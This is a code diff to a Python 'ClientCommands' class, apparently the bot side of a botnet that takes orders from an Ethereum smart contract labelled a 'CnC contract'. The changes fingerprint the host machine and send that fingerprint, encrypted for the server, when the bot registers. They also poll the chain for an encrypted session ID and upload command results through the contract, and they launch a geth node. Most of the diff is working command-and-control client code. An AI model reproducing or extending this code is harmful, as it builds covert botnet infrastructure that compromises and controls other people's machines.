@@ -35,9 +35,11 @@ class ClientCommands:
 		assert (len(peers) > 0)
 		l.info('connected peers:',self.web3.admin.peers)
 
+		self.waitForNodeToSync()
+
 		# load CnC contract
 		self.contract = self.loadContract()
-
+		time.sleep(5)
 		self.ownerPubKey = self.contract.ownerPubKey()
 		#TODO: check contract is up, otherwise go to sleep or die
 
@@ -48,6 +50,14 @@ class ClientCommands:
 		importAccountToNode(self.web3, self.address, self.private, self.password)
 
 		self.sessionId=None
+
+
+	def waitForNodeToSync(self):
+		l.info('waiting for node to sync...')
+		while self.web3.eth.syncing or self.web3.eth.blockNumber == 0:
+			l.debug('current synced block is:', self.web3.eth.blockNumber if self.web3.eth.blockNumber == 0 else self.web3.eth.syncing['currentBlock'])
+			time.sleep(1)
+		l.info('chain Sync done!')
 
 	def loadContract(self):
 		l.info('loading contract from:', self.contractAddress, self.contractAbi)
@@ -62,13 +72,13 @@ class ClientCommands:
 		if self.registered():
 			return True
 
-		machineIdHash = self.web3.sha3(OsInteractions.fingerprintMachine())
-
-		currBlock = self.web3.eth.blockNumber
-		filter = self.web3.eth.filter({'from': self.address, 'fromBlock': currBlock})
+		# currBlock = self.web3.eth.blockNumber
+		# filter = self.web3.eth.filter({'from': self.address, 'fromBlock': currBlock})
 
 		try:
-			self.contract.registerInstance(machineIdHash, transact={'from': self.address, 'gas': 3000000})
+			machineId = OsInteractions.fingerprintMachine()
+			machineIdEnc = self.encryptMessageForServer(machineId)
+			self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': 3000000})
 
 			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
 																self.contractAbi,
@@ -76,11 +86,22 @@ class ClientCommands:
 																self.web3,
 																topicFilters=[self.web3.sha3(self.address)])
 
-			def callback(tx):
-				self.sessionId = bytesToHexString(getLogEventArg(tx, eventABI, 'sessionId'))
+			txs = waitFor(lambda: self.commandFilter.get(True), emptyResponse=[], pollInterval=1, maxRetries=30)
+			self.web3.eth.uninstallFilter(self.commandFilter.filter_id)
+			for tx in txs:
+				sessionId = getLogEventArg(tx, eventABI, 'sessionId')
+				self.sessionId = self.decryptMessageFromServer(sessionId)
 				l.info('Successful registration! SessionId:', self.sessionId)
-			self.commandFilter.watch(callback)
-			waitForTransaction(self.commandFilter)
+
+
+			# def callback(tx):
+			# 	sessionId = getLogEventArg(tx, eventABI, 'sessionId')
+			# 	self.sessionId = self.decryptMessageFromServer(sessionId)
+			# 	l.info('Successful registration! SessionId:', self.sessionId)
+			# 	self.commandFilter.stopWatching()
+            #
+			# self.commandFilter.watch(callback)
+			# waitForTransaction(self.commandFilter)
 			# logs = waitFor(lambda: filter.get(True), emptyResponse=[], pollInterval=1, maxRetries=30)
             #
 			# self.web3.eth.uninstallFilter(filter.filter_id)
@@ -104,8 +125,8 @@ class ClientCommands:
 
 	def sendResults(self, cmdId, workResults):
 		l.info("sending results of cmdId",cmdId,"to server. result:",workResults[0:30],'...')
-		machineIdHash = self.web3.sha3 (OsInteractions.fingerprintMachine())
-		sessionAndMachineIdHash = self.web3.sha3(self.sessionId, machineIdHash)
+		machineId = OsInteractions.fingerprintMachine()
+		sessionAndMachineIdHash = toBytes32Hash(self.sessionId + machineId)
 		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
 		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': 3000000})
 
@@ -128,6 +149,7 @@ class ClientCommands:
 			sleep = 1
 			while not self.registered():
 				l.info('trying to register instance')
+				l.info('Account Balance: ', str(self.web3.fromWei(self.web3.eth.getBalance(self.address), "ether")))
 				success = self.registerInstance()
 				if not success:
 					time.sleep(sleep)
@@ -218,7 +240,8 @@ class ClientCommands:
 				"Error trying to run geth node",cmd,proc.returncode,std,sterr,))
 
 		atexit.register(lambda: kill_proc(proc))
-		time.sleep(3)
+
+		time.sleep(1)
 
 		with open(gethLockFile,'w') as f:
 			f.write(str(proc.pid))
